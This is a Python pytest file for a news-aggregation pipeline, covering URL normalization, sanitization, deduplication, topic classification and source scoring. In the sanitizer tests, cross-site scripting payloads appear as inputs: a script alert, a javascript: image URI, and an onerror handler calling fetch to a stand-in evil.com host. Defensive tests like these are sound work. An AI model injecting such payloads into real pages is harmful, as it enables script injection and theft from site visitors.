"""
Tests for all processor modules.
Run with: pytest tests/test_processors.py -v
"""
from datetime import datetime, timezone
import pytest

from sources.base import RawStory
from processors.normalizer import Normalizer, NormalizedStory
from processors.sanitizer import Sanitizer
from processors.deduplicator import Deduplicator
from processors.classifier import Classifier
from processors.credibility import CredibilityScorer
from processors.scorer import PriorityScorer


def make_story(**kwargs) -> NormalizedStory:
    defaults = dict(
        url_hash="abc123",
        content_hash="def456",
        title="Test Story About Technology",
        url="https://techcrunch.com/test",
        clean_url="https://techcrunch.com/test",
        domain="techcrunch.com",
        summary="A story about AI and machine learning breakthroughs.",
        author="John Doe",
        image_url="https://example.com/img.jpg",
        source_name="TechCrunch",
        published_at=datetime.now(timezone.utc),
        discovered_at=datetime.now(timezone.utc),
        extra={},
    )
    defaults.update(kwargs)
    return NormalizedStory(**defaults)


# ── Normalizer ────────────────────────────────────────────────────────────

class TestNormalizer:
    def setup_method(self):
        self.norm = Normalizer()

    def test_normalizes_valid_story(self):
        raw = RawStory(
            title="  Hello World  ",
            url="https://example.com/story?utm_source=twitter",
            source_name="Test",
            published_at=datetime.now(timezone.utc),
            summary="Summary here",
        )
        result = self.norm.normalize(raw)
        assert result is not None
        assert result.title == "Hello World"
        assert "utm_source" not in result.clean_url

    def test_returns_none_for_empty_title(self):
        raw = RawStory(title="", url="https://example.com", source_name="Test")
        assert self.norm.normalize(raw) is None

    def test_returns_none_for_empty_url(self):
        raw = RawStory(title="Title", url="", source_name="Test")
        assert self.norm.normalize(raw) is None

    def test_normalize_all_drops_invalid(self):
        raws = [
            RawStory(title="Valid", url="https://a.com", source_name="S"),
            RawStory(title="", url="https://b.com", source_name="S"),
            RawStory(title="Also valid", url="https://c.com", source_name="S"),
        ]
        results = self.norm.normalize_all(raws)
        assert len(results) == 2


# ── Sanitizer ─────────────────────────────────────────────────────────────

class TestSanitizer:
    def setup_method(self):
        self.san = Sanitizer()

    def test_strips_script_tags(self):
        story = make_story(title='Hello <script>alert("xss")</script> World')
        result = self.san.sanitize(story)
        assert "<script>" not in result.title
        assert "alert" not in result.title

    def test_strips_javascript_uri_from_image(self):
        story = make_story(image_url="javascript:alert(1)")
        result = self.san.sanitize(story)
        assert result.image_url == ""

    def test_strips_event_handlers(self):
        story = make_story(summary='Text <img src=x onerror="fetch(evil.com)"> more')
        result = self.san.sanitize(story)
        assert "onerror" not in result.summary

    def test_allows_clean_content(self):
        story = make_story(title="Clean title", summary="Normal summary with no threats.")
        result = self.san.sanitize(story)
        assert result.title == "Clean title"
        assert "Normal summary" in result.summary

    def test_truncates_long_title(self):
        story = make_story(title="A" * 600)
        result = self.san.sanitize(story)
        assert len(result.title) <= 500


# ── Deduplicator ──────────────────────────────────────────────────────────

class TestDeduplicator:
    def setup_method(self):
        self.dedup = Deduplicator()

    def test_removes_same_url_hash(self):
        s1 = make_story(url_hash="hash1", content_hash="c1")
        s2 = make_story(url_hash="hash1", content_hash="c2", title="Dupe URL")
        result = self.dedup.deduplicate([s1, s2])
        assert len(result) == 1

    def test_removes_same_content_hash(self):
        s1 = make_story(url_hash="h1", content_hash="same")
        s2 = make_story(url_hash="h2", content_hash="same")
        result = self.dedup.deduplicate([s1, s2])
        assert len(result) == 1

    def test_respects_existing_hashes(self):
        story = make_story(url_hash="exists", content_hash="c1")
        result = self.dedup.deduplicate([story], existing_url_hashes={"exists"})
        assert len(result) == 0

    def test_passes_unique_stories(self):
        stories = [
            make_story(url_hash=f"h{i}", content_hash=f"c{i}", title=f"Story {i}")
            for i in range(5)
        ]
        result = self.dedup.deduplicate(stories)
        assert len(result) == 5


# ── Classifier ────────────────────────────────────────────────────────────

class TestClassifier:
    def setup_method(self):
        self.clf = Classifier()

    def test_classifies_tech_story(self):
        story = make_story(title="New AI chip from semiconductor company", summary="")
        self.clf.classify(story)
        assert story.category == "technology"

    def test_classifies_finance_story(self):
        story = make_story(title="Sensex hits new high as RBI holds rate", summary="")
        self.clf.classify(story)
        assert story.category == "finance"

    def test_defaults_to_general(self):
        story = make_story(title="Something completely random and vague", summary="")
        self.clf.classify(story)
        assert story.category == "general"


# ── CredibilityScorer ─────────────────────────────────────────────────────

class TestCredibilityScorer:
    def setup_method(self):
        self.scorer = CredibilityScorer()

    def test_high_score_for_known_domain(self):
        story = make_story(domain="reuters.com")
        self.scorer.score(story)
        assert story.credibility_score >= 80

    def test_default_score_for_unknown_domain(self):
        story = make_story(domain="unknownblog123.com")
        self.scorer.score(story)
        assert 30 <= story.credibility_score <= 70

    def test_score_capped_at_100(self):
        story = make_story(domain="reuters.com", image_url="https://x.com/img.jpg")
        self.scorer.score(story)
        assert story.credibility_score <= 100

    def test_score_not_below_0(self):
        story = make_story(domain="reddit.com", source_name="reddit")
        self.scorer.score(story)
        assert story.credibility_score >= 0


# ── PriorityScorer ────────────────────────────────────────────────────────

class TestPriorityScorer:
    def setup_method(self):
        self.scorer = PriorityScorer()

    def test_score_is_between_0_and_100(self):
        story = make_story()
        story.credibility_score = 80
        self.scorer.score(story)
        assert 0 <= story.priority_score <= 100

    def test_sorts_highest_first(self):
        stories = [make_story(url_hash=f"h{i}", content_hash=f"c{i}") for i in range(3)]
        stories[0].credibility_score = 20
        stories[1].credibility_score = 90
        stories[2].credibility_score = 50
        result = self.scorer.score_all(stories)
        assert result[0].credibility_score == 90
